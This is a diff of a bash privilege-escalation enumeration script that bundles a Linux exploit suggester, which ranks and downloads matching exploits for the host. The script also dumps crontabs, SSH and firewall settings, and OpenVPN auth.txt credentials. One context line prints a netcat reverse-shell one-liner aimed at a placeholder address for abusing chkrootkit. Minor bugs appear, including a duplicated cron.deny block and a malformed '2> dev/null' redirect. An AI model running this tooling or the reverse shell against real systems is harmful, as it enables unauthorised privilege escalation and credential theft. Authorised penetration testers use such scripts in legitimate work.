         i=0
-        # ('-r' is used to not interpret backslash used for bash colors)
         while read -r line
         do
             arr[i]="$line"
             i=$((i + 1))
         done <<< "$FEATURE"
-        # modes: kernel-feature (1) | hw-feature (2) | 3rdparty-feature (3) | attack-surface (4)
         NAME="${arr[0]}"
         PRE_NAME="${NAME:0:8}"
         NAME="${NAME:9}"
-        if [ "${PRE_NAME}" = "section:" ]; then
-            # advance to next MODE
+        if [ "${PRE_NAME}" = "section:" ]; 
+        then
             MODE=$(($MODE + 1))
             echo
             echo -e "${NAME}${XX}"
@@ -2742,37 +2740,40 @@ EOF
         AVAILABLE="${arr[1]}" && AVAILABLE="${AVAILABLE:11}"
         ENABLE=$(echo "$FEATURE" | grep "enabled: " | awk -F'ed: ' '{print $2}')
         analysis_url=$(echo "$FEATURE" | grep "analysis-url: " | awk '{print $2}')
-        # split line with availability requirements & loop thru all availability reqs one by one & check whether it is met
         IFS=',' read -r -a array <<< "$AVAILABLE"
         AVAILABLE_REQS_NUM=${#array[@]}
         AVAILABLE_PASSED_REQ=0
         CONFIG=""
-        for REQ in "${array[@]}"; do
-            # find CONFIG_ name (if present) for current feature (only for display purposes)
-            if [ -z "$CONFIG" ]; then
+        for REQ in "${array[@]}"; 
+        do
+            if [ -z "$CONFIG" ]; 
+            then
                 config=$(echo "$REQ" | grep "CONFIG_")
                 [ -n "$config" ] && CONFIG="($(echo $REQ | cut -d'=' -f1))"
             fi
-            if (checkRequirement "$REQ"); then
+            if (checkRequirement "$REQ"); 
+            then
                 AVAILABLE_PASSED_REQ=$(($AVAILABLE_PASSED_REQ + 1))
             else
                 break
             fi
         done
-        # split line with enablement requirements & loop thru all enablement reqs one by one & check whether it is met
         ENABLE_PASSED_REQ=0
         ENABLE_REQS_NUM=0
         noSysctl=0
-        if [ -n "$ENABLE" ]; then
+        if [ -n "$ENABLE" ]; 
+        then
             IFS=',' read -r -a array <<< "$ENABLE"
             ENABLE_REQS_NUM=${#array[@]}
-            for REQ in "${array[@]}"; do
+            for REQ in "${array[@]}";
+            do
                 cmdStdout=$(checkRequirement "$REQ")
                 retVal=$?
-                if [ $retVal -eq 0 ]; then
+                if [ $retVal -eq 0 ]; 
+                then
                     ENABLE_PASSED_REQ=$(($ENABLE_PASSED_REQ + 1))
-                elif [ $retVal -eq 2 ]; then
-                # special case: sysctl entry is not present on given system: signal it as: N/A
+                elif [ $retVal -eq 2 ]; 
+                then
                     noSysctl=1
                     break
                 else
@@ -2781,8 +2782,10 @@ EOF
             done
         fi
         feature=$(echo "$FEATURE" | grep "feature: " | cut -d' ' -f 2-)
-        if [ -n "$cmdStdout" ]; then
-            if [ "$cmdStdout" -eq 0 ]; then
+        if [ -n "$cmdStdout" ]; 
+        then
+            if [ "$cmdStdout" -eq 0 ]; 
+            then
                 state="[ ${RED}Set to $cmdStdout${XX} ]"
                 cmdStdout=""
             else
@@ -2791,22 +2794,23 @@ EOF
             fi
         else
         unknown="[ ${GRAY}Unknown${XX}  ]"
-        # for 3rd party (3) mode display "N/A" or "Enabled"
-        if [ $MODE -eq 3 ]; then
+        if [ $MODE -eq 3 ]; 
+        then
             enabled="[ ${GREEN}Enabled${XX}   ]"
             disabled="[   ${GRAY}N/A${XX}    ]"
-        # for attack-surface (4) mode display "Locked" or "Exposed"
-        elif [ $MODE -eq 4 ]; then
+        elif [ $MODE -eq 4 ]; 
+        then
         enabled="[ ${RED}Exposed${XX}  ]"
         disabled="[ ${GREEN}Locked${XX}   ]"
-        #other modes" "Disabled" / "Enabled"
         else
             enabled="[ ${GREEN}Enabled${XX}  ]"
             disabled="[ ${RED}Disabled${XX} ]"
         fi
-        if [ -z "$KCONFIG" -a "$ENABLE_REQS_NUM" = 0 ]; then
+        if [ -z "$KCONFIG" -a "$ENABLE_REQS_NUM" = 0 ]; 
+        then
             state=$unknown
-        elif [ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM ]; then
+        elif [ $AVAILABLE_PASSED_REQ -eq $AVAILABLE_REQS_NUM -a $ENABLE_PASSED_REQ -eq $ENABLE_REQS_NUM ]; 
+        then
             state=$enabled
         else
             state=$disabled
@@ -2819,22 +2823,22 @@ EOF
     }
     displayExposure() {
         RANK=$1
-        if [ "$RANK" -ge 6 ]; then
+        if [ "$RANK" -ge 6 ]; 
+        then
             echo "highly probable"
-        elif [ "$RANK" -ge 3 ]; then
+        elif [ "$RANK" -ge 3 ]; 
+        then
             echo "probable"
         else
             echo "less probable"
         fi
     }
-
-    # parse command line parameters
     ARGS=$(getopt --options $SHORTOPTS  --longoptions $LONGOPTS -- "$@")
     [ $? != 0 ] && exitWithErrMsg "Aborting."
 
     eval set -- "$ARGS"
-
-    while true; do
+    while true; 
+    do
         case "$1" in
             -u|--uname)
                 shift
@@ -2896,7 +2900,8 @@ EOF
                 ;;
             *)
                 shift
-                if [ "$#" != "0" ]; then
+                if [ "$#" != "0" ]; 
+                then
                     exitWithErrMsg "Unknown option '$1'. Aborting."
                 fi
                 break
@@ -2904,308 +2909,211 @@ EOF
         esac
         shift
     done
-
-    # check Bash version (associative arrays need Bash in version 4.0+)
-    if ((BASH_VERSINFO[0] < 4)); then
+    if ((BASH_VERSINFO[0] < 4)); 
+    then
         exitWithErrMsg "Script needs Bash in version 4.0 or newer. Aborting."
     fi
-
-    # exit if both --kernel and --uname are set
     [ "$opt_kernel_version" = "true" ] && [ $opt_uname_string = "true" ] && exitWithErrMsg "Switches -u|--uname and -k|--kernel are mutually exclusive. Aborting."
-
-    # exit if both --full and --short are set
     [ "$opt_full" = "true" ] && [ $opt_summary = "true" ] && exitWithErrMsg "Switches -f|--full and -g|--short are mutually exclusive. Aborting."
-
-    # --cvelist-file mode is standalone mode and is not applicable when one of -k | -u | -p | --checksec switches are set
-    if [ "$opt_cvelist_file" = "true" ]; then
+    if [ "$opt_cvelist_file" = "true" ]; 
+    then
         [ ! -e "$CVELIST_FILE" ] && exitWithErrMsg "Provided CVE list ${RED}	File does not exists. Aborting."
         [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "Switches -k|--kernel and --cvelist-file are mutually exclusive. Aborting."
         [ "$opt_uname_string" = "true" ] && exitWithErrMsg "Switches -u|--uname and --cvelist-file are mutually exclusive. Aborting."
         [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "Switches -p|--pkglist-file and --cvelist-file are mutually exclusive. Aborting."
     fi
-
-    # --checksec mode is standalone mode and is not applicable when one of -k | -u | -p | --cvelist-file switches are set
-    if [ "$opt_checksec_mode" = "true" ]; then
+    if [ "$opt_checksec_mode" = "true" ]; 
+    then
         [ "$opt_kernel_version" = "true" ] && exitWithErrMsg "Switches -k|--kernel and --checksec are mutually exclusive. Aborting."
         [ "$opt_uname_string" = "true" ] && exitWithErrMsg "Switches -u|--uname and --checksec are mutually exclusive. Aborting."
         [ "$opt_pkglist_file" = "true" ] && exitWithErrMsg "Switches -p|--pkglist-file and --checksec are mutually exclusive. Aborting."
     fi
-
-    # extract kernel version and other OS info like distro name, distro version, etc. 3 possibilities here:
-    # case 1: --kernel set
-    if [ "$opt_kernel_version" == "true" ]; then
-        # TODO: add kernel version number validation
+    if [ "$opt_kernel_version" == "true" ]; 
+    then
         [ -z "$KERNEL" ] && exitWithErrMsg "Unrecognized kernel version given. Aborting."
         ARCH=""
         OS=""
-
-        # do not perform additional checks on current machine
         opt_skip_more_checks=true
-
-        # do not consider current OS
         getPkgList "" "$PKGLIST_FILE"
-
-    # case 2: --uname set
-    elif [ "$opt_uname_string" == "true" ]; then
+    elif [ "$opt_uname_string" == "true" ]; 
+    then
         [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty. Aborting."
         parseUname "$UNAME_A"
-
-        # do not perform additional checks on current machine
         opt_skip_more_checks=true
-
-        # do not consider current OS
         getPkgList "" "$PKGLIST_FILE"
-
-    # case 3: --cvelist-file mode
-    elif [ "$opt_cvelist_file" = "true" ]; then
-
-        # get kernel configuration in this mode
+    elif [ "$opt_cvelist_file" = "true" ]; 
+    then
         [ "$opt_skip_more_checks" = "false" ] && getKernelConfig
-
-    # case 4: --checksec mode
-    elif [ "$opt_checksec_mode" = "true" ]; then
-
-        # this switch is not applicable in this mode
+    elif [ "$opt_checksec_mode" = "true" ]; 
+    then
         opt_skip_more_checks=false
-
-        # get kernel configuration in this mode
         getKernelConfig
         [ -z "$KCONFIG" ] && echo "WARNING. Kernel Config not found on the system results won't be complete."
-
-        # launch checksec mode
         checksecMode
-
         exit 0
-
-    # case 5: no --uname | --kernel | --cvelist-file | --checksec set
     else
-
-        # --pkglist-file NOT provided: take all info from current machine
-        # case for vanilla execution: ./linux-exploit-suggester.sh
-        if [ "$opt_pkglist_file" == "false" ]; then
+        if [ "$opt_pkglist_file" == "false" ]; 
+        then
             UNAME_A=$(uname -a)
             [ -z "$UNAME_A" ] && exitWithErrMsg "uname string empty. Aborting."
             parseUname "$UNAME_A"
-
-            # get kernel configuration in this mode
             [ "$opt_skip_more_checks" = "false" ] && getKernelConfig
-
-            # extract distribution version from /etc/os-release OR /etc/lsb-release
             [ -n "$OS" -a "$opt_skip_more_checks" = "false" ] && DISTRO=$(grep -s -E '^DISTRIB_RELEASE=|^VERSION_ID=' /etc/*-release | cut -d'=' -f2 | head -1 | tr -d '"')
-
-            # extract package listing from current OS
             getPkgList "$OS" ""
-
-        # --pkglist-file provided: only consider userspace exploits against provided package listing
         else
             KERNEL=""
-            #TODO: extract machine arch from package listing
             ARCH=""
             unset EXPLOITS
             declare -A EXPLOITS
             getPkgList "" "$PKGLIST_FILE"
-
-            # additional checks are not applicable for this mode
             opt_skip_more_checks=true
         fi
     fi
-
     echo
     echo
     echo "${#EXPLOITS[@]} kernel space exploits"
     echo "${#EXPLOITS_USERSPACE[@]} user space exploits"
     echo
-
     echo -e "${RED}    ══{ Possible Exploits:${XX}"
     echo
-
-    # start analysis
     j=0
-    for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; do
-
-        # create array from current exploit here doc and fetch needed lines
+    for EXP in "${EXPLOITS[@]}" "${EXPLOITS_USERSPACE[@]}"; 
+    do
         i=0
-        # ('-r' is used to not interpret backslash used for bash colors)
         while read -r line
         do
             arr[i]="$line"
             i=$((i + 1))
         done <<< "$EXP"
-
         NAME="${arr[0]}" && NAME="${NAME:6}"
         REQS="${arr[1]}" && REQS="${REQS:6}"
         TAGS="${arr[2]}" && TAGS="${TAGS:6}"
         RANK="${arr[3]}" && RANK="${RANK:6}"
-
-        # split line with requirements & loop thru all reqs one by one & check whether it is met
         IFS=',' read -r -a array <<< "$REQS"
         REQS_NUM=${#array[@]}
         PASSED_REQ=0
-        for REQ in "${array[@]}"; do
-            if (checkRequirement "$REQ" "${array[0]}"); then
+        for REQ in "${array[@]}"; 
+        do
+            if (checkRequirement "$REQ" "${array[0]}"); 
+            then
                 PASSED_REQ=$(($PASSED_REQ + 1))
             else
                 break
             fi
         done
-
-        # execute for exploits with all requirements met
-        if [ $PASSED_REQ -eq $REQS_NUM ]; then
-
-            # additional requirement for --cvelist-file mode: check if CVE associated with the exploit is on the CVELIST_FILE
-            if [ "$opt_cvelist_file" = "true" ]; then
-
-                # extract CVE(s) associated with given exploit (also translates ',' to '|' for easy handling multiple CVEs case - via extended regex)
+        if [ $PASSED_REQ -eq $REQS_NUM ]; 
+        then
+            if [ "$opt_cvelist_file" = "true" ]; 
+            then
                 cve=$(echo "$NAME" | grep '.*\[.*\].*' | cut -d 'm' -f2 | cut -d ']' -f1 | tr -d '[' | tr "," "|")
-                #echo "CVE: $cve"
-
-                # check if it's on CVELIST_FILE list, if no move to next exploit
                 [ ! $(cat "$CVELIST_FILE" | grep -E "$cve") ] && continue
             fi
-
-            # process tags and highlight those that match current OS (only for deb|ubuntu|RHEL and if we know distro version - direct mode)
             tags=""
-            if [ -n "$TAGS" -a -n "$OS" ]; then
+            if [ -n "$TAGS" -a -n "$OS" ]; 
+            then
                 IFS=',' read -r -a tags_array <<< "$TAGS"
                 TAGS_NUM=${#tags_array[@]}
-
-                # bump RANK slightly (+1) if we're in '--uname' mode and there's a TAG for OS from uname string
                 [ "$(echo "${tags_array[@]}" | grep "$OS")" -a "$opt_uname_string" == "true" ] && RANK=$(($RANK + 1))
 
-                for TAG in "${tags_array[@]}"; do
+                for TAG in "${tags_array[@]}"; 
+                do
                     tag_distro=$(echo "$TAG" | cut -d'=' -f1)
                     tag_distro_num_all=$(echo "$TAG" | cut -d'=' -f2)
-                    # in case of tag of form: 'ubuntu=16.04{kernel:4.4.0-21} remove kernel versioning part for comparision
                     tag_distro_num="${tag_distro_num_all%{*}"
-
-                    # we're in '--uname' mode OR (for normal mode) if there is distro version match
-                    if [ "$opt_uname_string" == "true" -o \( "$OS" == "$tag_distro" -a "$(echo "$DISTRO" | grep -E "$tag_distro_num")" \) ]; then
-
-                        # bump current exploit's rank by 2 for distro match (and not in '--uname' mode)
+                    if [ "$opt_uname_string" == "true" -o \( "$OS" == "$tag_distro" -a "$(echo "$DISTRO" | grep -E "$tag_distro_num")" \) ]; 
+                    then
                         [ "$opt_uname_string" == "false" ] && RANK=$(($RANK + 2))
-
-                        # get name (kernel or package name) and version of kernel/pkg if provided:
                         tag_pkg=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 1)
                         tag_pkg_num=""
                         [ $(echo "$tag_distro_num_all" | grep '{') ] && tag_pkg_num=$(echo "$tag_distro_num_all" | cut -d'{' -f 2 | tr -d '}' | cut -d':' -f 2)
-
-                        #[ -n "$tag_pkg_num" ] && echo "tag_pkg_num: $tag_pkg_num; kernel: $KERNEL_ALL"
-
-                        # if pkg/kernel version is not provided:
-                        if [ -z "$tag_pkg_num" ]; then
+                        if [ -z "$tag_pkg_num" ]; 
+                        then
                             [ "$opt_uname_string" == "false" ] && TAG="${YELLOW}[ ${TAG}  } ${XX}"
-
-                        # kernel version provided, check for match:
-                        elif [ -n "$tag_pkg_num" -a "$tag_pkg" = "kernel" ]; then
-                            if [ $(echo "$KERNEL_ALL" | grep -E "${tag_pkg_num}") ]; then
-                                # kernel version matched - bold highlight
+                        elif [ -n "$tag_pkg_num" -a "$tag_pkg" = "kernel" ]; 
+                        then
+                            if [ $(echo "$KERNEL_ALL" | grep -E "${tag_pkg_num}") ]; 
+                            then
                                 TAG="${YELLOW}[ ${TAG}  } ${XX}"
-
-                                # bump current exploit's rank additionally by 3 for kernel version regex match
                                 RANK=$(($RANK + 3))
                             else
                                 [ "$opt_uname_string" == "false" ] && TAG="${YELLOW}[ $tag_distro=$tag_distro_num  } ${XX}{kernel:$tag_pkg_num}"
                             fi
-
-                        # pkg version provided, check for match (TBD):
-                        elif [ -n "$tag_pkg_num" -a -n "$tag_pkg"  ]; then
+                        elif [ -n "$tag_pkg_num" -a -n "$tag_pkg"  ]; 
+                        then
                             TAG="${YELLOW}[ $tag_distro=$tag_distro_num  } ${XX}{$tag_pkg:$tag_pkg_num}"
                         fi
 
                     fi
-
-                    # append current tag to tags list
                     tags="${tags}${TAG},"
                 done
-                # trim ',' added by above loop
                 [ -n "$tags" ] && tags="${tags%?}"
             else
                 tags="$TAGS"
             fi
-
-            # insert the matched exploit (with calculated Rank and highlighted tags) to arrary that will be sorted
             EXP=$(echo "$EXP" | sed -e '/^Name:/d' -e '/^Reqs:/d' -e '/^Tags:/d')
             exploits_to_sort[j]="${RANK}Name: ${NAME}D3L1mReqs: ${REQS}D3L1mTags: ${tags}D3L1m$(echo "$EXP" | sed -e ':a' -e 'N' -e '$!ba' -e 's/\n/D3L1m/g')"
             ((j++))
         fi
     done
-
-    # sort exploits based on calculated Rank
     IFS=$'\n'
     SORTED_EXPLOITS=($(sort -r <<<"${exploits_to_sort[*]}"))
     unset IFS
-
-    # display sorted exploits
-    for EXP_TEMP in "${SORTED_EXPLOITS[@]}"; do
-
+    for EXP_TEMP in "${SORTED_EXPLOITS[@]}"; 
+    do
         RANK=$(echo "$EXP_TEMP" | awk -F'Name:' '{print $1}')
-
-        # convert entry back to canonical form
         EXP=$(echo "$EXP_TEMP" | sed 's/^[0-9]//g' | sed 's/D3L1m/\n/g')
-
-        # create array from current exploit here doc and fetch needed lines
         i=0
-        # ('-r' is used to not interpret backslash used for bash colors)
         while read -r line
         do
             arr[i]="$line"
             i=$((i + 1))
         done <<< "$EXP"
-
         NAME="${arr[0]}" && NAME="${NAME:6}"
         REQS="${arr[1]}" && REQS="${REQS:6}"
         TAGS="${arr[2]}" && tags="${TAGS:6}"
-
         EXPLOIT_DB=$(echo "$EXP" | grep "exploit-db: " | awk '{print $2}')
         analysis_url=$(echo "$EXP" | grep "analysis-url: " | awk '{print $2}')
         ext_url=$(echo "$EXP" | grep "ext-url: " | awk '{print $2}')
         comments=$(echo "$EXP" | grep "Comments: " | cut -d' ' -f 2-)
         reqs=$(echo "$EXP" | grep "Reqs: " | cut -d' ' -f 2)
-
-        # exploit name without CVE number and without commonly used special chars
         name=$(echo "$NAME" | cut -d' ' -f 2- | tr -d ' ()/')
-
         bin_url=$(echo "$EXP" | grep "bin-url: " | awk '{print $2}')
         src_url=$(echo "$EXP" | grep "src-url: " | awk '{print $2}')
         [ -z "$src_url" ] && [ -n "$EXPLOIT_DB" ] && src_url="https://www.exploit-db.com/download/$EXPLOIT_DB"
         [ -z "$src_url" ] && [ -z "$bin_url" ] && exitWithErrMsg "'src-url' / 'bin-url' / 'exploit-db' entries are all empty for '$NAME' exploit - fix that. Aborting."
-
-        if [ -n "$analysis_url" ]; then
+        if [ -n "$analysis_url" ]; 
+        then
             details="$analysis_url"
-        elif $(echo "$src_url" | grep -q 'www.exploit-db.com'); then
+        elif $(echo "$src_url" | grep -q 'www.exploit-db.com'); 
+        then
             details="https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
-        elif [[ "$src_url" =~ ^.*tgz|tar.gz|zip$ && -n "$EXPLOIT_DB" ]]; then
+        elif [[ "$src_url" =~ ^.*tgz|tar.gz|zip$ && -n "$EXPLOIT_DB" ]]; 
+        then
             details="https://www.exploit-db.com/exploits/$EXPLOIT_DB/"
         else
             details="$src_url"
         fi
-
-        # skip DoS by default
         dos=$(echo "$EXP" | grep -o -i "(dos")
         [ "$opt_show_dos" == "false" ] && [ -n "$dos" ] && continue
-
-        # handles --fetch-binaries option
-        if [ $opt_fetch_bins = "true" ]; then
-            for i in $(echo "$EXP" | grep "bin-url: " | awk '{print $2}'); do
+        if [ $opt_fetch_bins = "true" ]; 
+        then
+            for i in $(echo "$EXP" | grep "bin-url: " | awk '{print $2}'); 
+            do
                 [ -f "${name}_$(basename $i)" ] && rm -f "${name}_$(basename $i)"
                 wget -q -k "$i" -O "${name}_$(basename $i)"
             done
         fi
-
-        # handles --fetch-sources option
-        if [ $opt_fetch_srcs = "true" ]; then
+        if [ $opt_fetch_srcs = "true" ]; 
+        then
             [ -f "${name}_$(basename $src_url)" ] && rm -f "${name}_$(basename $src_url)"
             wget -q -k "$src_url" -O "${name}_$(basename $src_url)" &
         fi
-
-        # display result (short)
-        if [ "$opt_summary" = "true" ]; then
+        if [ "$opt_summary" = "true" ]; 
+        then
         [ -z "$tags" ] && tags="-"
         echo -e "$NAME || $tags || $src_url"
         continue
         fi
-
-    # display result (standard)
         echo -e "[+] $NAME"
         echo -e "\n   Details: $details"
             echo -e "   Exposure: $(displayExposure $RANK)"
@@ -3213,34 +3121,23 @@ EOF
             echo -e "   Download URL: $src_url"
             [ -n "$ext_url" ] && echo -e "   ext-url: $ext_url"
             [ -n "$comments" ] && echo -e "   Comments: $comments"
-
-            # handles --full filter option
-            if [ "$opt_full" = "true" ]; then
+            if [ "$opt_full" = "true" ]; 
+            then
                 [ -n "$reqs" ] && echo -e "   Requirements: $reqs"
-
                 [ -n "$EXPLOIT_DB" ] && echo -e "   exploit-db: $EXPLOIT_DB"
-
                 author=$(echo "$EXP" | grep "author: " | cut -d' ' -f 2-)
                 [ -n "$author" ] && echo -e "   author: $author"
             fi
-
             echo
-
     done
 echo -e "\n${BLUE}╔═════{ System Release:${XX}"
     cat /etc/*-release 2>/dev/null
+echo -e "\n${BLUE}╔═════{ lsb Release:${XX}"
+    lsb_release
 echo -e "\n${BLUE}╔═════{ Host name:${XX}"
-    hostname 2>/dev/null
+    hostnamectl 2>/dev/null
 echo -e "\n${BLUE}╔═════{ System Version:${XX}"
     cat /proc/version
-        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║The version is not listed in our database. However, make sure to keep your system always up-to-date. Old version are║"
-        echo -e "\t║always vulnerable. Visit the link bellow for more details:                                                          ║"
-        echo -e "\t║    https://github.com/SecWiki/linux-kernel-exploits                                                                ║"
-        echo -e "\t║Or use:                                                                                                             ║"
-        echo -e "\t║    searchsploit 'Linux version'                                                                                    ║"
-        echo -e "\t║    https://github.com/InteliSecureLabs/Linux_Exploit_Suggester                                                     ║"
-        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Is sudo version vulnerable?${XX}"
     sudo -V | grep version
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -3399,9 +3296,9 @@ echo -e "\n${BLUE}╔═════{ System Date:${XX}"
 echo -e "\n${BLUE}╔═════{ CPU Information:${XX}"
     lscpu 2>/dev/null
 echo -e "\n${BLUE}╔═════{ System Timer List:${XX}"
-    systemctl list-timers --all 2>/dev/null & sleep 2 ; kill $!
+    systemctl list-timers --all 2>/dev/null ## & sleep 2 ; kill $!
 echo -e "\n${BLUE}╔═════{ backuperer.timer:${XX}"
-    systemctl list-timers --all | grep backuperer.timer 2>/dev/null & sleep 2 ; kill $!
+    systemctl list-timers --all | grep backuperer.timer 2>/dev/null ## & sleep 2 ; kill $!
 echo -e "\n${BLUE}    ══{ backuperer.timer location:${XX}"
         locate backupere.timer
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -3521,8 +3418,8 @@ echo -e "\n${BLUE}    ══{ Is the .bashrc file writable?${XX}"
 echo -e "\n${BLUE}    ══{ Is the .bash_profile file writable?${XX}"
     locate .bash_profile | xargs ls -la --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
-        echo -e "\t║bash_profile is executed when logging in to the system initially. This happens when logging in to the machine itself║"
-        echo -e "\t║via a serial console or SSH.                                                                                        ║"
+        echo -e "\t║The ~/.bash_profile file is a configuration file for configuring user environments. The users can modify the default║"
+        echo -e "\t║settings and add any extra configurations in it.                                                                    ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}    ══{ Exploit them:${XX}"
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
@@ -3592,16 +3489,62 @@ echo -e "${RED} \t\t ═══════════════════�
 echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
 echo -e "\n"
 echo -e "\n${BLUE}╔═════{ Current User Crontab:${XX}"
-    crontab -l
-echo -e "\n${BLUE}╔═════{ Find World-Writable Cron jobs:${XX}"
-    find /etc/cron* -type f -perm -o+w -exec ls -l {} \;
-echo -e "\n${BLUE}╔═════{ Other User Crontab [It may need root]:${XX}"
+    crontab -l 2>/dev/null
+echo -e "\n${BLUE}    ══{ Spool Area:${XX}"
+    ls -LR /var/spool/cron 2>/dev/null
+echo -e "\n${BLUE}    ══{ etc Area:${XX}"
+    ls -al /etc/ | grep cron 2>/dev/null
+echo -e "\n${BLUE}    ══{ at.allow:${XX}"
+    if [ -f /etc/at.allow ]; 
+        then
+		    cat /etc/at.allow 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ at.deny:${XX}"
+    if [ -f /etc/at.deny ]; 
+        then
+		    cat /etc/at.deny 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ cron.allow:${XX}"
+    if [ -f /etc/cron.allow ]; 
+        then
+		    cat /etc/cron.allow 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ cron.deny:${XX}"
+    if [ -f /etc/cron.deny ]; 
+        then
+		    cat /etc/cron.deny 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ cron.deny:${XX}"
+    if [ -f /etc/cron.deny ]; 
+        then
+		    cat /etc/cron.deny 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ Anacrontab:${XX}"
+    if [ -f /etc/anacrontab ]; 
+        then
+		    cat /etc/anacrontab 2>/dev/null
+        else
+            echo -e "  ${RED}File does not exist${XX}"
+    fi
+echo -e "\n${BLUE}    ══{ Find World-Writable Cron jobs:${XX}"
+    find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 2>/dev/null
+echo -e "\n${BLUE}    ══{ Other User Crontab [It may need root]:${XX}"
     cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If you have the root/user password, try to run the command manually:                                                ║"
         echo -e "\t║    cut -d ':' -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null                                               ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
-echo -e "\n${BLUE}╔═════{ Scheduled Jobs:${XX}"
+echo -e "\n${BLUE}    ══{ Scheduled Jobs:${XX}"
     cat /etc/crontab 2>/dev/null
         echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║If the file is running by root, & ${RED}writable to anyone${XX}, the attacker my replace the content of the file.               ║"
@@ -3629,7 +3572,7 @@ echo -e "\n${BLUE}╔═════{ Default Gatway:${XX}"
 echo -e "\n${BLUE}╔═════{ Full Network Details:${XX}"
     ifconfig
 echo -e "\n${BLUE}╔═════{ Firewall Rulls:${XX}"
-    iptables -nvL 2>/dev/null
+    iptables -nvL
 echo -e "\n${BLUE}╔═════{ Other users & hosts are communicating with the system:${XX}"
     lsof -i
 echo -e "\n${BLUE}╔═════{ Open Ports:${XX}"
@@ -3666,6 +3609,10 @@ echo -e "\n${BLUE}╔═════{ SSH is configured for Public Key Authentic
     if [ -f /etc/ssh/sshd_config ]; 
 	    then
     	    cat /etc/ssh/sshd_config | grep 'PubkeyAuthentication' --color=always 
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║is a method in which you generate and store on your computer a pair of cryptographic keys and then configure your   ║"
+        echo -e "\t║server to recognize and accept your keys. A private key, usually named id_rsa, A public key, named id_rsa.pub       ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
         else
      		echo -e "${RED}	File does not exist${XX}"
     fi
@@ -4089,7 +4036,7 @@ echo -e "\n${BLUE}╔═════{ Chkrootkit:${XX}"
         echo -e "\t║echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 1234 >/tmp/f' >> update ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}╔═════{ Modified Files Past 60 min:${XX}"
-    find / -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/\|/run/\|/dev/\|/var/' | xargs ls -ld --color=always 2> /dev/null
+    find / -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/\|/run/\|/dev/\|/var/' | xargs ls -ld --color=always 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║It can be useful to check files that were modified recently, as they may be containing      ║"
         echo -e "\t║useful information and/or credentials.                                                      ║"
@@ -4100,6 +4047,13 @@ echo -e "\n${BLUE}╔═════{ Git User:${XX}"
     cat /etc/passwd | grep git-shell 2>/dev/null
 echo -e "\n${BLUE}╔═════{ OpenVPN Files:${XX}"
     find / -iname *.ovpn -type f 2>/dev/null
+echo -e "\n${BLUE}    ══{ auth.txt:${XX}"
+    if [ -f /etc/openvpn/auth.txt ];
+        then
+            cat /etc/openvpn/auth.txt 2> dev/null
+        else
+            echo -e "${RED}	File does not exist${XX}"
+    fi
 echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
 echo -e "${RED} \t\t ════════════════════════════════════════[ Scanning Target Network ]═════════════════════════════════════ ${XX}"
 echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
